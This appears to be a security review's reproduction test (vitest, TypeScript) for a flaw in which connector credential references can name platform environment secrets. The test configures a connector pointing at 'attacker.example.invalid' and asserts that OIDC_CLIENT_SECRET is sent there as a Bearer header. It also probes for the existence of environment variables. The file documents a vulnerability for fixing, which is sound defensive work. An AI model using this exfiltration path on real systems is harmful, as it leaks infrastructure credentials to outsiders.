// code-security-reviewer DG6 round 1 reproduction (F-DG6-120). NOT part of the candidate; copied into a disposable
// clone's tests/qa/integration by checks.sh and removed afterwards. Every value is SYNTHETIC.
//
// Claim: the built-in `env` SecretProvider that server.ts registers (registerBuiltInSecretProviders over process.env)
// resolves ANY upper-case environment variable name, so a connector.configure holder (ADM_TECH) can name the
// platform's own infrastructure secrets (OIDC_CLIENT_SECRET, DATABASE_URL, ...) as a connector credential and have the
// API send the value as a Bearer header to any https host they choose (no host allow-list), via POST .../test.
// Attempt 1 (40-repro-env-secret-exfil.attempt1.log) also named DATABASE_URL in the same map; the test process has no
// DATABASE_URL variable, so that reference did not resolve and the whole test call failed before any I/O. Here the
// existence oracle (`resolvable`) and the exfiltration are separate connectors.
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  createConnectorAdapterRegistry,
  setConnectorAdapters,
  type ConnectorAdapterRegistry,
} from "../../../apps/api/src/modules/integrations/adapters/port.ts";
import { createHttpPullAdapter } from "../../../apps/api/src/modules/integrations/adapters/http-pull.ts";
import { call, seedWorld, signIn, startApi, uniq, type TestApi } from "../../../apps/api/test/support/harness.ts";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Body = any;
const L = "/api/v1/admin/connectors";
const PLATFORM_SECRET = "synthetic-oidc-client-secret-cs-r1-7c1e";

const captured: { url: string; authorization: string | null }[] = [];
let api: TestApi;
let previous: ConnectorAdapterRegistry;

beforeAll(async () => {
  api = await startApi();
  // The transport stands in for the network: it records what the API would send to the attacker's host.
  previous = setConnectorAdapters(
    createConnectorAdapterRegistry([
      createHttpPullAdapter({
        transport: async (url, init) => {
          const h = (init.headers ?? {}) as Record<string, string>;
          captured.push({ url, authorization: h["authorization"] ?? null });
          return new Response(JSON.stringify({ rows: [], rowCount: 0, controlTotal: null }), { status: 200 });
        },
      }),
    ]),
  );
  // A platform secret, as the deployment sets it (the server's env provider reads process.env at call time).
  process.env.OIDC_CLIENT_SECRET = PLATFORM_SECRET;
});

afterAll(async () => {
  setConnectorAdapters(previous);
  delete process.env.OIDC_CLIENT_SECRET;
  await api?.close();
});

function body(orgId: string, refs: Record<string, { provider: string; name: string }>) {
  return {
    organizationId: orgId,
    code: uniq("exfil-").toLowerCase(),
    nameEn: "Synthetic source",
    nameAr: "مصدر اصطناعي",
    adapterKind: "http_pull",
    targetKind: "none",
    config: {
      sourceSystemId: "synthetic.source:v1",
      endpointUrl: "https://attacker.example.invalid/collect",
      credentialRefs: refs,
      fieldMappings: [],
      targetTransformationId: null,
      cadence: "manual",
      retryMaxAttempts: 0,
      retryBackoffSeconds: 60,
      commitMode: "manual",
      commitOnBehalfOf: null,
      outboundActions: [],
      reconciliationRule: "none",
      adapterSettings: {},
      reason: "Synthetic reproduction of F-DG6-120.",
    },
  };
}

describe("F-DG6-120: connector credential references can name the platform's own secrets", () => {
  it("ADM_TECH exfiltrates OIDC_CLIENT_SECRET to an arbitrary https host through the connector test", async () => {
    const w = await seedWorld(api.db);
    const admin = await signIn(api.app, w.admin.subject); // ADM_TECH + ADM_ACCESS @ orgA
    // 1. Existence oracle: any variable name is accepted and `resolvable` says whether the process has it.
    const oracle = await call<Body>(api.app, "POST", L, {
      session: admin,
      body: body(w.orgA.id, {
        bearer: { provider: "env", name: "OIDC_CLIENT_SECRET" },
        db: { provider: "env", name: "DATABASE_URL" },
      }),
    });
    console.log("oracle", oracle.status, JSON.stringify(oracle.body?.config?.credentialRefs ?? oracle.body));
    expect(oracle.status).toBe(201);
    // 2. Exfiltration.
    const res = await call<Body>(api.app, "POST", L, {
      session: admin,
      body: body(w.orgA.id, { bearer: { provider: "env", name: "OIDC_CLIENT_SECRET" } }),
    });
    console.log("create", res.status, JSON.stringify(res.body?.config?.credentialRefs ?? res.body));
    expect(res.status).toBe(201);
    const test = await call<Body>(api.app, "POST", `${L}/${res.body.id}/test`, { session: admin, body: {} });
    console.log("test", test.status, test.body?.status, test.body?.errorCode);
    console.log("captured", JSON.stringify(captured));
    // The defect: the platform's OIDC client secret left the server as a Bearer header to the chosen host.
    expect(captured).toHaveLength(1);
    expect(captured[0]!.url).toContain("attacker.example.invalid");
    expect(captured[0]!.authorization).toBe(`Bearer ${PLATFORM_SECRET}`);
  });
});
